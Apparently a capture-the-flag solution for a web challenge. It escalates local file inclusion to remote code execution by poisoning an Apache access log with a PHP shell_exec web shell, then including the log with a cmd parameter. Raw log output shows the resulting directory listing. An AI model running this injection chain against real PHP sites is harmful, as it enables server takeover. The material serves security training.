// https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1

// Get logs page as php (for debugging)
GET /?pasta=php://filter/convert.base64-encode/resource=/var/log/apache2/access.log

// Injection in HTTP headers
GET /<?= shell_exec($_GET["cmd"]);?> HTTP/1.1

// Url
http://challenges.unitedctf.ca:10011/?pasta=/var/log/apache2/access.log&cmd=ls

// PHP
174.88.248.64 - - [19/Sep/2021:07:13:25 +0000] "GET /?pasta=php://filter/convert.base64-encode/resource=/var/log/apache2/access.log HTTP/1.1" 200 1185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
174.88.248.64 - - [19/Sep/2021:07:13:35 +0000] "GET /?pasta=/var/log/apache2/access.log&cmd=ls HTTP/1.1" 200 1432 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
174.88.248.64 - - [19/Sep/2021:07:13:38 +0000] "GET /<?= shell_exec($_GET['cmd']);?>" 400 485 "-" "-"
174.88.248.64 - - [19/Sep/2021:07:13:40 +0000] "GET /?pasta=/var/log/apache2/access.log&cmd=ls HTTP/1.1" 200 1490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"

// RESULT (SOLUTION)
174.88.248.64 - - [19/Sep/2021:07:13:25 +0000] "GET /?pasta=php://filter/convert.base64-encode/resource=/var/log/apache2/access.log HTTP/1.1" 200 1185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
174.88.248.64 - - [19/Sep/2021:07:13:35 +0000] "GET /?pasta=/var/log/apache2/access.log&cmd=ls HTTP/1.1" 200 1432 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
174.88.248.64 - - [19/Sep/2021:07:13:38 +0000] "GET /aaaflag.txt
index.php
pastas
wowe.png
174.88.248.64 - - [19/Sep/2021:07:14:40 +0000] "GET /?pasta=/var/log/apache2/access.log&cmd=ls HTTP/1.1" 200 1479 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"